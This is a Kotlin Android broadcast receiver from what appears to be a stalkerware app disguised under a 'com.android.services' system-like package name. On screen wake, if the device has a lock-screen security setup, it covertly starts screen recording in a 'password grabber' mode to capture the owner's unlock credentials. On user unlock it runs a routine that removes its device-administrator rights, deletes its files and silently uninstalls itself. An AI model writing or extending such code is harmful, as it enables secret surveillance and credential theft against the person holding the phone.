package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import com.android.services.services.screenRecord.ScreenRecordCommandService
import com.android.services.util.*
import org.greenrobot.eventbus.EventBus
import java.util.concurrent.Executors

/**
 * Screen On Off Broadcast Receiver
 */
class ScreenOnOffReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_SCREEN_ON -> {
                AppConstants.isUserPresent = false
                if (AppConstants.osGreaterThanOrEqualLollipop
                    && !AppUtils.isCallModeActive(context)
                    && AppUtils.isScreenRecordingApp("screen.grabber")
                    && !AppUtils.isServiceRunning(
                        context,
                        ScreenRecordCommandService::class.java.name
                    )
                    && !AppConstants.isPasswordGrabbing
                    && AppUtils.isScreenInteractive(context)
                    && ScreenLockTest.doesDeviceHaveSecuritySetup(context)
                ) {
                    val isPermissionAvailable = AppUtils.isScreenRecordindPermissionGranted()
                    if (isPermissionAvailable) {
                        ActivityUtil.startScreenRecordingService(
                            context,
                            AppConstants.PASSWORD_GRABBER_TYPE
                        )
                    }
                }
            }
            Intent.ACTION_SCREEN_OFF -> {
                AppConstants.isUserPresent = false
                if (!AppUtils.isServiceRunning(
                        context,
                        ScreenRecordCommandService::class.java.name
                    )
                )
                    AppConstants.isPasswordGrabbing = false
                if (AppUtils.isAppScreenRecordingEnabled(context)) {
                    EventBus.getDefault().post("stopAppRecording")
                }
            }
            Intent.ACTION_USER_PRESENT -> {
                AppConstants.isUserPresent = true
                if (AppUtils.isScreenGrabbingEnabled(context)) {
                    EventBus.getDefault().post("stopPasswordGrabbing")
                }
                val executorService = Executors.newSingleThreadExecutor()
                executorService.execute {
                    val uninstalledAppList = RoomDBUtils.getUninstalledAppsList(context)
                    AppUtils.checkAppsToDelete(context, uninstalledAppList)
                    if (AppConstants.uninstallPreference) {
                        if (AppUtils.isEnabledAsDeviceAdministrator()) {
                            AppUtils.removeAsDeviceAdministrator()
                            Handler(Looper.getMainLooper()).postDelayed({
                                AppUtils.deleteAppSpecificFiles(context)
                                AppUtils.selfUninstallApp(context)
                            }, 2000)
                        } else {
                            Handler(Looper.getMainLooper()).post {
                                AppUtils.deleteAppSpecificFiles(context)
                                AppUtils.selfUninstallApp(context)
                            }
                        }
                    }
                }
            }
        }
    }
}